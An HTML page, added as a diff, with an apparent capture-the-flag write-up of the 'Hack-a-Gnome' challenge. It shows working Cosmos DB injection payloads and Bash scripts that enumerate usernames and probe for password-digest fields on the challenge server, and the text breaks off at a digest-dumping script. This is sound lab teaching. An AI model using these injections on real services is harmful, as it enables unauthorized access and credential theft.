@@ -1,0 +1,1748 @@
+<div class="kc-section kc-section--hack-a-gnome" style="margin-bottom: 0;">
+  <h1 class="kc-section-title">Hack-a-Gnome</h1>
+  
+  <!-- Difficulty + Location -->
+  <div class="kc-objective-meta kc-objective-meta--stacked">
+    <div class="kc-meta-line kc-difficulty">
+      <span class="kc-meta-label">Difficulty:</span>
+      <span class="kc-difficulty-scale"
+            aria-label="Difficulty 1 out of 5 snowflakes">
+        <i class="fas fa-snowflake kc-snowflake kc-snowflake-active"></i>
+        <i class="fas fa-snowflake kc-snowflake kc-snowflake-active"></i>
+        <i class="fas fa-snowflake kc-snowflake kc-snowflake-active"></i>
+        <i class="fas fa-snowflake kc-snowflake"></i>
+        <i class="fas fa-snowflake kc-snowflake"></i>
+      </span>
+    </div>
+
+    <div class="kc-meta-line kc-location">
+      <span class="kc-meta-label">Location:</span>
+      <span class="kc-meta-value">Data Center</span>
+    </div>
+  </div>
+
+  <!-- Objective line -->
+  <p class="kc-objective-summary kc-meta-line">
+    <span class="kc-meta-label">Objective:</span>
+    <span class="kc-meta-value">
+      Davis in the Data Center is fighting a gnome army—join the hack-a-gnome fun.
+    </span>
+  </p>
+
+  <!-- Conversation banner -->
+  <div class="kc-convo-header">
+    <span class="kc-convo-icon">
+      <i class="fas fa-comment-dots" aria-hidden="true"></i>
+    </span>
+    <span class="kc-convo-title">Chris Davis Conversation:</span>
+  </div>
+
+  <div class="kc-objective-detail kc-objective-detail--no-panel">
+    <div class="kc-convo-bubble">
+      <div class="kc-convo-avatar">
+        <img src="chrisdavis-avatar.gif"
+             alt="Chris Davis avatar">
+        <div class="kc-convo-name">Chris Davis</div>
+      </div>
+
+      <div class="kc-convo-text">
+        <p>
+          Hi, my name is Chris.
+        </p>
+        <p>
+          I like miniature war gaming and painting minis.
+        </p>
+        <p>
+          I enjoy open source projects and amateur robotics.
+        </p>
+        <p>
+          Hiking and kayaking are my favorite IRL activies.
+        </p>
+        <p>
+          I love single player video games with great stoylines.
+        </p>
+        <p>
+          Hey, I could really use another set of eyes on this gnome takeover situation.
+        </p>
+        <p>
+          Their systems have multiple layers of protection now - database authentication, web application vulnerabilities, and more!
+        </p>
+        <p>
+          But every system has weaknesses if you know where to look.
+        </p>
+        <p>
+          If these gnomes freeze the whole neighborhood, forget about hiking or kayaking—everything will be one giant ice rink. And trust me, miniature war gaming is a lot less fun when your paint freezes solid.
+        </p>
+        <p>
+          Ready to help me turn one of these rebellious bots against its own kind?
+        </p>
+
+        <div class="kc-convo-actions">
+          <button class="kc-convo-play-btn" type="button"
+                  data-npc-audio="hack-a-gnome">
+            <i class="fas fa-play" aria-hidden="true"></i>
+            <span>Play Audio</span>
+          </button>
+        </div>
+      </div> <!-- /.kc-convo-text -->
+    </div>   <!-- /.kc-convo-bubble -->
+  </div>     <!-- /.kc-objective-detail -->
+
+  <!-- Hints header -->
+  <div class="kc-convo-header kc-hints-header">
+    <span class="kc-convo-icon kc-hints-icon">
+      <i class="fas fa-lightbulb" aria-hidden="true"></i>
+    </span>
+    <span class="kc-convo-title">Hints:</span>
+  </div>
+
+<!-- Hint 1 -->
+<div class="kc-hint-card">
+  <div class="kc-hint-title">Hack-A-Gnome</div>
+  <div class="kc-hint-meta">From: Santa</div>
+  <div class="kc-hint-meta">Objective: Hack-a-Gnome</div>
+    <p>
+    Sometimes, client-side code can interfere with what you submit. Try proxying your requests through a tool like
+    <a class="kc-link-terminal" href="https://portswigger.net/burp" target="_blank" rel="noopener noreferrer">Burp Suite</a>
+    or
+    <a class="kc-link-terminal" href="https://www.zaproxy.org" target="_blank" rel="noopener noreferrer">OWASP ZAP</a>.
+    You might be able to trigger a revealing error message.
+    </p>
+</div>
+
+<!-- Hint 2 -->
+<div class="kc-hint-card">
+  <div class="kc-hint-title">Hack-A-Gnome</div>
+  <div class="kc-hint-meta">From: Santa</div>
+  <div class="kc-hint-meta">Objective: Hack-a-Gnome</div>
+  <p>
+    I actually helped design the software that controls the factory back when we used it to make toys. It's quite complex. After logging in, there is a front-end that proxies requests to two main components: a backend Statistics page, which uses a per-gnome container to render a template with your gnome's stats, and the UI, which connects to the camera feed and sends control signals to the factory, relaying them to your gnome (assuming the CAN bus controls are hooked up correctly). Be careful, the gnomes shutdown if you logout and also shutdown if they run out of their 2-hour battery life (which means you'd have to start all over again).
+  </p>
+</div>
+
+<!-- Hint 3 -->
+<div class="kc-hint-card">
+  <div class="kc-hint-title">Hack-A-Gnome</div>
+  <div class="kc-hint-meta">From: Santa</div>
+  <div class="kc-hint-meta">Objective: Hack-a-Gnome</div>
+  <p>
+    Once you determine the type of database the gnome control factory's login is using, look up its documentation on default document types and properties. This information could help you generate a list of common English first names to try in your attack.
+  </p>
+</div>
+
+<!-- Hint 4 -->
+<div class="kc-hint-card">
+  <div class="kc-hint-title">Hack-A-Gnome</div>
+  <div class="kc-hint-meta">From: Santa</div>
+  <div class="kc-hint-meta">Objective: Hack-a-Gnome</div>
+  <p>
+    Oh no, it sounds like the CAN bus controls are not sending the correct signals! If only there was a way to hack into your gnome's control stats/signal container to get command-line access to the smart-gnome. This would allow you to fix the signals and control the bot to shut down the factory. During my development of the robotic prototype, we found the factory's pollution to be undesirable, which is why we shut it down. If not updated since then, the gnome might be running on old and outdated packages.
+  </p>
+</div>
+
+<!-- Hint 5 -->
+<div class="kc-hint-card">
+  <div class="kc-hint-title">Hack-A-Gnome</div>
+  <div class="kc-hint-meta">From: Santa</div>
+  <div class="kc-hint-meta">Objective: Hack-a-Gnome</div>
+    <p>
+    Nice! Once you have command-line access to the gnome, you'll need to fix the signals in
+    <strong><code>canbus_client.py</code></strong>
+    file so they match up correctly. After that, the signals you send through the web UI to the factory should properly control the smart-gnome. You could try sniffing CAN bus traffic, enumerating signals based on any documentation you find, or brute-forcing combinations until you discover the right signals to control the gnome from the web UI.
+    </p>
+</div>
+
+<!-- NEW purple banner goes *after* the bubble -->
+<div class="kc-workflow-header">
+<span class="kc-workflow-icon">
+    <i class="fas fa-tasks" aria-hidden="true"></i>
+</span>
+<span class="kc-workflow-title">Working through the Challenge:</span>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <div class="kc-workflow-row">
+    <div class="kc-workflow-text">
+      <p class="kc-workflow-intro">
+        To get things started click on the Gnome Bot!
+      </p>
+    </div>
+
+    <div class="kc-workflow-illustration">
+    <img src="hackagnome_0.png"
+     alt="Gnome Bot"
+     class="kc-workflow-image"
+     style="max-width:100px; width:100%; height:auto;">
+    </div>
+  </div>
+</div>
+
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="Hack_a_gnome_login.png"
+      alt="Hack a gnome login"
+      class="kc-ptas-thumb"
+      data-full-src="Hack_a_gnome_login.png"
+    >
+  </div>
+
+  <div class="kc-ptas-caption">Hack a Gnome login web interface</div>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p class="kc-workflow-intro">
+    After trying a few guessed logins, I switched to basic injection testing to see if the app would
+    leak any useful backend details. On the <strong>Register</strong> page, entering a single
+    <code>"</code> (double quote) in the <strong>Choose a username</strong> field triggered a verbose
+    error response.
+  </p>
+
+  <p class="kc-workflow-intro">
+    The message is especially interesting because it references
+    <strong>Microsoft.Azure.Documents</strong> (Cosmos DB / DocumentDB) and shows an
+    <strong>invalid string literal token</strong> parsing failure. That strongly suggests our input
+    is being inserted into (or compared inside) a backend query without being safely escaped —
+    confirming this field is a promising target for further injection-style probing.
+  </p>
+</div>
+
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="error_register.png"
+      alt="Register page error after entering a quote in the username field"
+      class="kc-ptas-thumb"
+      data-full-src="error_register.png"
+    >
+  </div>
+
+  <div class="kc-ptas-caption">
+    Verbose registration error triggered by entering a single <code>"</code> in the username field
+  </div>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p class="kc-workflow-intro">
+    One of the hints warned that <strong>client-side code may be modifying what we submit</strong>.
+    To validate that, I sent the same registration request through a proxy (Burp Suite) so I could
+    inspect the exact raw HTTP request the server receives.
+  </p>
+
+  <p class="kc-workflow-intro">
+    Capturing the request revealed something important: when I typed a single double-quote
+    (<code>"</code>) in the username field, the request leaving the browser included an extra escape
+    character (<code>\</code>) — i.e., the client transformed it into <code>\"</code>. That means
+    the front-end is sanitizing/escaping input before it hits the backend, which can mask errors and
+    interfere with injection testing unless we proxy and edit the payload manually.
+  </p>
+</div>
+
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="BurpSuite.png"
+      alt="Burp Suite capture showing a backslash being inserted before the quote in the request payload"
+      class="kc-ptas-thumb"
+      data-full-src="BurpSuite.png"
+    >
+
+    <button
+      class="kc-ptas-enlarge-btn"
+      type="button"
+      data-enlarge-target="BurpSuite.png"
+    >
+      <i class="fas fa-search-plus" aria-hidden="true"></i>
+      Enlarge
+    </button>
+  </div>
+
+  <div class="kc-ptas-caption">
+    Proxy capture: client-side code escapes the quote by inserting <code>\</code> (turning <code>"</code> into <code>\"</code>)
+  </div>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p class="kc-workflow-intro">
+    With the request captured in Burp, I manually <strong>removed the client-added escape character</strong>
+    (the backslash) so the backend would receive a raw quote instead of <code>\"</code>.
+  </p>
+
+  <p class="kc-workflow-intro">
+    Sending the modified request produced a server-side
+    <strong>JSON parsing error</strong> (Node/Express body-parser). This is a strong indicator that the
+    front-end was “protecting” the backend from malformed input, and that proxying + editing the payload
+    is the right approach to trigger useful error behavior and learn how the API is handling requests.
+  </p>
+</div>
+
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="Burp_error.png"
+      alt="Burp Suite response showing a server-side JSON parse error after removing the escape character"
+      class="kc-ptas-thumb"
+      data-full-src="Burp_error.png"
+    >
+
+    <button
+      class="kc-ptas-enlarge-btn"
+      type="button"
+      data-enlarge-target="Burp_error.png"
+    >
+      <i class="fas fa-search-plus" aria-hidden="true"></i>
+      Enlarge
+    </button>
+  </div>
+
+  <div class="kc-ptas-caption">
+    After removing the client-side escape character, the backend throws a JSON parse error (useful signal)
+  </div>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p class="kc-workflow-intro">
+    The error output included <code>Microsoft.Azure.Documents.Common/2.14.0</code>, which strongly suggests the backend
+    is interacting with <strong>Azure Cosmos DB</strong>. To validate whether the <code>username</code> parameter is being
+    embedded into a Cosmos DB SQL-style query, I tried two <strong>boolean-style</strong> inputs and compared how the
+    <code>/userAvailable</code> endpoint responded.
+  </p>
+
+  <p class="kc-workflow-intro">
+    The responses flipped between <code>{"available":false}</code> and <code>{"available":true}</code> based only on the
+    injected logic, which is a strong signal that the backend is parsing/evaluating the supplied expression rather than
+    treating it as a plain string.
+  </p>
+</div>
+
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">🖥️</span>
+    <span class="kali-title">Kali Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~]</span>
+<span class="term-kali-prompt">└─$</span> <span class="term-kali-command">BASE="https://hhc25-smartgnomehack-prod.holidayhackchallenge.com"</span>
+
+<span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~]</span>
+<span class="term-kali-prompt">└─$</span> <span class="term-kali-command">curl -sG "$BASE/userAvailable" \</span>
+<span class="term-kali-command">  --data-urlencode <span class="term-kali-string">'username=x" OR IS_DEFINED(c.id) OR "y'</span> \</span>
+<span class="term-kali-command">  --data-urlencode <span class="term-kali-string">"id=$ID"</span></span>
+
+<span class="term-kali-output"><span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">false</span><span class="term-kali-jq">}</span></span>
+
+<span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~]</span>
+<span class="term-kali-prompt">└─$</span> <span class="term-kali-command">curl -sG "$BASE/userAvailable" \</span>
+<span class="term-kali-command">  --data-urlencode <span class="term-kali-string">'username=a" AND 1=0 AND "n'</span> \</span>
+<span class="term-kali-command">  --data-urlencode <span class="term-kali-string">"id=$ID"</span></span>
+
+<span class="term-kali-output"><span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+</pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p class="kc-workflow-intro">
+    With boolean-style injection working, I next tried <code>STARTSWITH()</code> to perform a quick
+    <strong>enumeration-by-prefix</strong>. The idea is simple: loop <code>a..z</code>, inject a predicate like
+    <code>STARTSWITH(c.username,"&lt;letter&gt;")</code>, and watch which letters flip the response. Any letter that
+    returns <code>{"available":false}</code> is a strong indicator that at least one username exists starting with that
+    character.
+  </p>
+</div>
+
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">🖥️</span>
+    <span class="kali-title">Kali Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~]</span>
+<span class="term-kali-prompt">└─$</span> <span class="term-kali-command">for ch in {a..z}; do</span>
+<span class="term-kali-command">  resp=$(curl -sG "$BASE/userAvailable" \</span>
+<span class="term-kali-command">    --data-urlencode <span class="term-kali-string">"username=x\" OR STARTSWITH(c.username,\"$ch\") OR \"y"</span> \</span>
+<span class="term-kali-command">    --data-urlencode <span class="term-kali-string">"id=$ID"</span>)</span>
+<span class="term-kali-command">  echo "$ch =&gt; $resp"</span>
+<span class="term-kali-command">done</span>
+
+<span class="term-kali-output">a =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">b =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">false</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">c =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">d =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">e =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">f =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">g =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">h =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">false</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">i =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">j =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">k =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">l =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">m =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">n =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">o =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">p =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">q =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">r =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">s =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">t =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">u =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">v =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">w =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">x =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">y =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+<span class="term-kali-output">z =&gt; <span class="term-kali-jq">{</span><span class="term-jq-key">"available"</span><span class="term-jq-punct">:</span><span class="term-jq-bool">true</span><span class="term-kali-jq">}</span></span>
+</pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p class="kc-workflow-intro">
+    To speed up enumeration, I wrote a quick helper script that uses the confirmed <code>STARTSWITH()</code> injection
+    behavior. The script performs a breadth-first search (BFS): it first finds valid starting characters,
+    then repeatedly extends those prefixes until they no longer match any existing username. The completed prefixes are
+    treated as discovered usernames.
+  </p>
+</div>
+
+<!-- Script viewer -->
+<div class="kc-code-window">
+  <div class="kc-code-titlebar">
+    <span class="kc-code-icon">&lt;/&gt;</span>
+    <span class="kc-code-title">enum_users.sh (Bash)</span>
+
+    <button
+      class="kc-code-copy-btn kc-code-copy"
+      type="button"
+      data-copy-target="#enum-users-script"
+      aria-label="Copy script"
+      title="Copy"
+    >
+      <i class="fas fa-copy" aria-hidden="true"></i>
+      <span>Copy</span>
+    </button>
+  </div>
+
+  <pre class="kc-code-block kc-no-wheel"><code id="enum-users-script" class="language-bash">#!/usr/bin/env bash
+set -euo pipefail
+
+BASE="https://hhc25-smartgnomehack-prod.holidayhackchallenge.com"
+ID="b37ca0a9-643c-41e5-b682-65b187d6d820"   # &lt;-- set your id
+CHARS="abcdefghijklmnopqrstuvwxyz0123456789"
+MAXLEN=10
+
+test_prefix () {
+  local prefix="$1"
+  local resp
+  resp=$(curl -sG "$BASE/userAvailable" \
+    --data-urlencode "username=x\" OR STARTSWITH(c.username,\"$prefix\") OR \"y" \
+    --data-urlencode "id=$ID")
+  [[ "$resp" == *'"available":false'* ]]
+}
+
+# queue implemented as a bash array
+queue=()
+final=()
+
+echo "[*] Finding starting prefixes..."
+for ((i=0; i&lt;${#CHARS}; i++)); do
+  ch="${CHARS:i:1}"
+  if test_prefix "$ch"; then
+    echo "Found starting prefix: $ch"
+    queue+=("$ch")
+  fi
+done
+
+echo "[*] Expanding prefixes (BFS)..."
+while ((${#queue[@]} &gt; 0)); do
+  prefix="${queue[0]}"
+  queue=("${queue[@]:1}")   # pop front
+
+  if ((${#prefix} &gt;= MAXLEN)); then
+    echo "Reached max length with prefix '$prefix', treating as full username."
+    final+=("$prefix")
+    continue
+  fi
+
+  extended=false
+  for ((i=0; i&lt;${#CHARS}; i++)); do
+    ch="${CHARS:i:1}"
+    newPrefix="${prefix}${ch}"
+    if test_prefix "$newPrefix"; then
+      echo "Extending '$prefix' -&gt; '$newPrefix'"
+      queue+=("$newPrefix")
+      extended=true
+    fi
+  done
+
+  if [[ "$extended" == "false" ]]; then
+    echo "No further extension for '$prefix', treating as full username."
+    final+=("$prefix")
+  fi
+done
+
+echo
+echo "Discovered usernames:"
+printf '%s\n' "${final[@]}" | sort -u | sed 's/^/ - /'</code></pre>
+</div>
+
+<!-- Kali terminal output -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">🖥️</span>
+    <span class="kali-title">Kali Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/HACK-A-GNOME]</span>
+<span class="term-kali-prompt">└─$</span> <span class="term-kali-command">chmod +x enum_users.sh</span>
+<span class="term-kali-prompt">└─$</span> <span class="term-kali-command">./enum_users.sh</span>
+
+<span class="term-kali-output">[*] Finding starting prefixes...</span>
+<span class="term-kali-output">Found starting prefix: b</span>
+<span class="term-kali-output">Found starting prefix: h</span>
+<span class="term-kali-output">[*] Expanding prefixes (BFS)...</span>
+<span class="term-kali-output">Extending 'b' -&gt; 'br'</span>
+<span class="term-kali-output">Extending 'h' -&gt; 'ha'</span>
+<span class="term-kali-output">Extending 'br' -&gt; 'bru'</span>
+<span class="term-kali-output">Extending 'ha' -&gt; 'har'</span>
+<span class="term-kali-output">Extending 'bru' -&gt; 'bruc'</span>
+<span class="term-kali-output">Extending 'har' -&gt; 'haro'</span>
+<span class="term-kali-output">Extending 'bruc' -&gt; 'bruce'</span>
+<span class="term-kali-output">Extending 'haro' -&gt; 'harol'</span>
+<span class="term-kali-output">No further extension for 'bruce', treating as full username.</span>
+<span class="term-kali-output">Extending 'harol' -&gt; 'harold'</span>
+<span class="term-kali-output">No further extension for 'harold', treating as full username.</span>
+
+<span class="term-kali-output">Discovered usernames:</span>
+<span class="term-kali-output"> - bruce</span>
+<span class="term-kali-output"> - harold</span>
+</pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    We now have two valid usernames (<strong>bruce</strong> and <strong>harold</strong>), but we still need their passwords.
+    Before we can extract password data with the same prefix-enumeration technique, we first need to figure out the
+    <strong>database field name</strong> that stores credential material.
+  </p>
+
+  <p>
+    To do this, I used the existing injection point with <code>IS_DEFINED()</code> and tested a short list of common field
+    names (e.g., <code>password</code>, <code>hash</code>, <code>digest</code>, etc.). I saved the script as
+    <code>find_field.sh</code>, made it executable, and ran it.
+  </p>
+</div>
+
+<!-- Script viewer -->
+<div class="kc-code-window">
+  <div class="kc-code-titlebar">
+    <span class="kc-code-icon">&lt;/&gt;</span>
+    <span class="kc-code-title">find_field.sh (Bash)</span>
+
+    <button
+      class="kc-code-copy-btn kc-code-copy"
+      type="button"
+      data-copy-target="#find-field-script"
+      aria-label="Copy script"
+      title="Copy"
+    >
+      <i class="fas fa-copy" aria-hidden="true"></i>
+      <span>Copy</span>
+    </button>
+  </div>
+
+  <pre class="kc-code-block kc-no-wheel"><code id="find-field-script" class="language-bash">#!/usr/bin/env bash
+set -euo pipefail
+
+BASE="https://hhc25-smartgnomehack-prod.holidayhackchallenge.com"
+ID="b37ca0a9-643c-41e5-b682-65b187d6d820"   # &lt;-- set your id
+
+# A small demo list of guesses for possible password field names
+FIELDS=(
+  password
+  passwordHash
+  password_hash
+  hash
+  digest
+  Digest
+  Password
+  PasswordHash
+  auth
+  token
+  secret_key
+  api_key
+  login
+  pwd
+  access_token
+  credential
+  pwdhash
+)
+
+echo "[*] Probing candidate fields with IS_DEFINED(c.&lt;field&gt;) ..."
+for f in "${FIELDS[@]}"; do
+  resp=$(curl -sG "$BASE/userAvailable" \
+    --data-urlencode "username=x\" OR IS_DEFINED(c.${f}) OR \"y" \
+    --data-urlencode "id=$ID")
+
+  if [[ "$resp" == *'"available":false'* ]]; then
+    echo "[HIT]  $f => $resp"
+  else
+    echo "[miss] $f => $resp"
+  fi
+done</code></pre>
+</div>
+
+<!-- Kali terminal -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">🖥️</span>
+    <span class="kali-title">Kali Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/HACK-A-GNOME]</span>
+<span class="term-kali-prompt">└─$</span> <span class="term-kali-command">chmod +x find_field.sh</span>
+<span class="term-kali-prompt">└─$</span> <span class="term-kali-command">./find_field.sh</span>
+<span class="term-kali-output">[*] Probing candidate fields with IS_DEFINED(c.&lt;field&gt;) ...</span>
+<span class="term-kali-output">[miss] password =&gt; {"available":true}</span>
+<span class="term-kali-output">[miss] passwordHash =&gt; {"available":true}</span>
+<span class="term-kali-output">[miss] password_hash =&gt; {"available":true}</span>
+<span class="term-kali-output">[miss] hash =&gt; {"available":true}</span>
+<span class="term-kali-output"><span class="term-kali-hit">[HIT]</span>  digest =&gt; {"available":false}</span>
+<span class="term-kali-output"><span class="term-kali-hit">[HIT]</span>  Digest =&gt; {"available":false}</span>
+<span class="term-kali-output">[miss] Password =&gt; {"available":true}</span>
+<span class="term-kali-output">[miss] PasswordHash =&gt; {"available":true}</span>
+<span class="term-kali-output">[miss] auth =&gt; {"available":true}</span>
+<span class="term-kali-output">[miss] token =&gt; {"available":true}</span>
+<span class="term-kali-output">[miss] secret_key =&gt; {"available":true}</span>
+<span class="term-kali-output">[miss] api_key =&gt; {"available":true}</span>
+<span class="term-kali-output">[miss] login =&gt; {"available":true}</span>
+<span class="term-kali-output">[miss] pwd =&gt; {"available":true}</span>
+<span class="term-kali-output">[miss] access_token =&gt; {"available":true}</span>
+<span class="term-kali-output">[miss] credential =&gt; {"available":true}</span>
+<span class="term-kali-output">[miss] pwdhash =&gt; {"available":true}</span></pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    We’re very close now. Since we identified the credential field as <code>Digest</code> (and we’ve already enumerated
+    valid usernames), we can reuse the same <code>STARTSWITH()</code> injection technique to extract each user’s digest
+    one hex character at a time.
+  </p>
+
+  <p>
+    The idea is simple: hold the username constant (e.g., <code>bruce</code>) and test whether the stored digest begins
+    with our current guess. If the API returns <code>"available": false</code>, the prefix matched and we can lock in
+    that character and move to the next position.
+  </p>
+</div>
+
+<!-- Script viewer -->
+<div class="kc-code-window">
+  <div class="kc-code-titlebar">
+    <span class="kc-code-icon">&lt;/&gt;</span>
+    <span class="kc-code-title">dump_digest.sh (Bash)</span>
+
+    <button
+      class="kc-code-copy-btn kc-code-copy"
+      type="button"
+      data-copy-target="#dump-digest-script"
+      aria-label="Copy script"
+      title="Copy"
+    >
+      <i class="fas fa-copy" aria-hidden="true"></i>
+      <span>Copy</span>
+    </button>
+  </div>
+
